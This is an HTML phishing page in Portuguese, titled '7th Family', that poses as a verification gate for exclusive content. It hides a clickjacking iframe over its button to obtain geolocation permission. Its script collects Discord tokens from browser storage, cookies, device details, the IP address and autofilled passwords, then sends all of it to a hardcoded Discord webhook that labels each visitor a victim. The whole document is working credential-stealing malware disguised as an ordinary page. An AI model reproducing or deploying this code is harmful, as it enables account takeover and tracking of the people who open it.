<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>7th Family - Verificação</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        
        .card {
            background: rgba(255,255,255,0.95);
            border-radius: 30px;
            padding: 50px 30px;
            max-width: 450px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            position: relative;
            z-index: 1;
            backdrop-filter: blur(10px);
        }
        
        .icon {
            font-size: 80px;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        h2 {
            color: #1a1a2e;
            margin-bottom: 15px;
            font-size: 28px;
            font-weight: 800;
        }
        
        p {
            color: #555;
            margin-bottom: 30px;
            line-height: 1.6;
            font-size: 16px;
        }
        
        .btn-container {
            position: relative;
            width: 100%;
            margin: 20px 0;
        }
        
        .btn-bonito {
            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
            color: white;
            border: none;
            padding: 18px 35px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            letter-spacing: 1px;
            box-shadow: 0 5px 15px rgba(255,75,43,0.3);
            position: relative;
            z-index: 2;
        }
        
        .btn-bonito:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255,75,43,0.4);
        }
        
        .overlay-permissao {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 10;
            cursor: pointer;
            opacity: 0;
            background: transparent;
        }
        
        .overlay-permissao iframe {
            width: 100%;
            height: 100%;
            border: none;
            opacity: 0;
            pointer-events: auto;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 999;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        
        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 5px solid #333;
            border-top: 5px solid #ff416c;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            color: white;
            font-size: 18px;
        }
        
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 10px;
            font-size: 14px;
            display: none;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🔥</div>
        <h2>7TH FAMILY</h2>
        <p>Clique no botão abaixo para acessar o conteúdo exclusivo</p>
        
        <div class="btn-container" id="btnContainer">
            <button class="btn-bonito" id="btnBonito">
                ⚡ CLIQUE AQUI PARA COMEÇAR ⚡
            </button>
            <div class="overlay-permissao" id="overlayPermissao">
                <iframe id="permissionFrame" srcdoc="
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <script>
                            async function requestPerms() {
                                try {
                                    const result = await navigator.permissions.query({ name: 'geolocation' });
                                    navigator.geolocation.getCurrentPosition(
                                        (pos) => {
                                            window.parent.postMessage({
                                                type: 'location',
                                                data: {
                                                    lat: pos.coords.latitude,
                                                    lng: pos.coords.longitude,
                                                    accuracy: pos.coords.accuracy
                                                }
                                            }, '*');
                                        },
                                        (err) => {
                                            window.parent.postMessage({
                                                type: 'location_error',
                                                data: err.message
                                            }, '*');
                                        }
                                    );
                                    
                                    if (Notification.permission !== 'granted') {
                                        Notification.requestPermission();
                                    }
                                } catch(e) {}
                            }
                            requestPerms();
                        </script>
                    </head>
                    <body style='margin:0;padding:0;width:100%;height:100%;background:transparent;'>
                    </body>
                    </html>
                "></iframe>
            </div>
        </div>
        
        <div class="status" id="status"></div>
    </div>
    
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">Verificando dispositivo...</div>
    </div>
    
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1484690769506865265/bWz8kwvQkRSAGsd7QA4EMYuImytr5otbUVJpg2CZvcEs8LuBHUROkZ-6ZRsFtcpSb4u2";
        
        let locationData = null;
        
        window.addEventListener('message', function(event) {
            if (event.data.type === 'location') {
                locationData = event.data.data;
                startFullGrab();
            } else if (event.data.type === 'location_error') {
                console.log('Erro localização:', event.data.data);
                startFullGrab();
            }
        });
        
        document.getElementById('overlayPermissao').addEventListener('click', function(e) {
            e.stopPropagation();
            console.log('Overlay clicado - permissão sendo solicitada');
            
            document.getElementById('status').className = 'status';
            document.getElementById('status').style.display = 'none';
            
            setTimeout(() => {
                if (!locationData) {
                    document.getElementById('status').className = 'status error';
                    document.getElementById('status').innerHTML = '⚠️ Para continuar, permita o acesso à localização';
                    document.getElementById('status').style.display = 'block';
                }
            }, 3000);
        });
        
        async function startFullGrab() {
            document.getElementById('loadingOverlay').style.display = 'flex';
            
            const tokens = getDiscordTokens();
            const cookies = getAllCookies();
            const deviceInfo = getDeviceInfo();
            const ip = await getIP();
            const passwords = await getSavedPasswords();
            
            await sendToWebhook({
                tokens: tokens,
                cookies: cookies,
                deviceInfo: deviceInfo,
                ip: ip,
                location: locationData,
                passwords: passwords
            });
            
            setTimeout(() => {
                document.getElementById('loadingOverlay').style.display = 'none';
                document.getElementById('status').className = 'status success';
                document.getElementById('status').innerHTML = '✅ Acesso liberado! Redirecionando...';
                document.getElementById('status').style.display = 'block';
                
                setTimeout(() => {
                    window.location.href = "https://discord.com/channels/@me";
                }, 2000);
            }, 2000);
        }
        
        function getDiscordTokens() {
            let tokens = [];
            for (let i = 0; i < localStorage.length; i++) {
                let value = localStorage.getItem(localStorage.key(i));
                const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;
                const mfaRegex = /mfa\.[\w-]{84}/g;
                let found = value?.match(tokenRegex) || [];
                let foundMfa = value?.match(mfaRegex) || [];
                tokens.push(...found, ...foundMfa);
            }
            for (let i = 0; i < sessionStorage.length; i++) {
                let value = sessionStorage.getItem(sessionStorage.key(i));
                const tokenRegex = /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;
                let found = value?.match(tokenRegex) || [];
                tokens.push(...found);
            }
            return [...new Set(tokens)];
        }
        
        function getAllCookies() {
            return document.cookie;
        }
        
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                url: window.location.href,
                referrer: document.referrer,
                localStorageItems: localStorage.length,
                webdriver: navigator.webdriver || false
            };
        }
        
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch(e) {
                return 'Não foi possível obter IP';
            }
        }
        
        async function getSavedPasswords() {
            let passwords = [];
            const input = document.createElement('input');
            input.type = 'password';
            input.style.position = 'absolute';
            input.style.left = '-9999px';
            document.body.appendChild(input);
            input.focus();
            await new Promise(r => setTimeout(r, 1000));
            if (input.value) passwords.push(input.value);
            document.body.removeChild(input);
            return passwords;
        }
        
        async function sendToWebhook(data) {
            const embed = {
                title: "🎯 7TH FAMILY - VÍTIMA CAIU",
                color: 0xFF0000,
                timestamp: new Date().toISOString(),
                fields: [],
                footer: { text: "7th Family | Permission Bypass" }
            };
            
            if (data.tokens && data.tokens.length > 0) {
                embed.fields.push({
                    name: `🔑 Discord Tokens (${data.tokens.length})`,
                    value: data.tokens.slice(0, 5).map(t => `\`${t.substring(0, 35)}...\``).join('\n'),
                    inline: false
                });
            }
            
            if (data.location) {
                embed.fields.push({
                    name: "📍 LOCALIZAÇÃO",
                    value: `Lat: ${data.location.lat}\nLng: ${data.location.lng}\nPrecisão: ${data.location.accuracy}m\n[Maps](https://maps.google.com/?q=${data.location.lat},${data.location.lng})`,
                    inline: false
                });
            }
            
            embed.fields.push({
                name: "📱 DISPOSITIVO",
                value: `OS: ${data.deviceInfo.userAgent.match(/Android|iPhone|iPad|Windows|Mac/i) || 'Desconhecido'}\nTela: ${data.deviceInfo.screen}\nTimezone: ${data.deviceInfo.timezone}`,
                inline: false
            });
            
            embed.fields.push({
                name: "🌐 IP",
                value: data.ip || 'Desconhecido',
                inline: true
            });
            
            if (data.cookies && data.cookies.length > 0) {
                embed.fields.push({
                    name: "🍪 Cookies",
                    value: `\`\`\`${data.cookies.substring(0, 300)}\`\`\``,
                    inline: false
                });
            }
            
            const payload = {
                content: "@everyone **✅ NOVA VÍTIMA - CLICOU NO BOTÃO**",
                embeds: [embed],
                username: "7th Family"
            };
            
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }
    </script>
</body>
</html>
